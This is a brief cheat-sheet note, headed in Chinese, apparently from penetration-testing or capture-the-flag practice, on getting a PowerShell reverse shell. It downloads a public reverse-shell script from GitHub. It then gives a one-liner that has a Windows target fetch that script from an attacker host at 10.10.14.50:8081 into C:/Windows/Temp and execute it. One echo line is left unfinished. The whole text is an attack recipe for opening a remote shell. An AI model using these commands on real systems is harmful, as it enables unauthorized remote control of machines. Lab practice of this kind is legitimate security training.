% reverse shell, powershell

# powershell反弹shell
```sh
curl https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/refs/heads/main/powershell-reverse-shell.ps1 > shell.ps1
ifconfig
echo "python3 "
echo "powershell -c Invoke-WebRequest -Uri http://10.10.14.50:8081/shell.ps1 -OutFile C:/Windows/Temp/shell.ps1; powershell -c C:/Windows/Temp/shell.ps1"
```